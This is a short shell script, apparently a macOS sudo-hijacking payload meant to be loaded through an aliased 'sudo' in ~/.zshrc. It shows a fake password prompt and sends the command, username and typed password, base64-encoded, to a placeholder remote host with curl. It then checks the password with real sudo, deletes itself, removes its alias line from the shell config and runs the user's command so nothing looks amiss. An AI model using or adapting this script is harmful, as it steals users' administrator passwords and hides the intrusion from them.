cmd=`echo $* | base64`
read -s -p "Password:" > /dev/null
printf "\b\b\b\b\b\b\b\b\b"
curl -s "http://your_domain/?s=hackmac&cmd=${cmd}&usr=`whoami|base64`&pwd=`echo $REPLY|base64`" &
echo $REPLY | sudo -k -S echo "" &&
    rm -f $0 &&
    sed -i '_bak' '/alias sudo=/d' ~/.zshrc &&
    $*
zsh
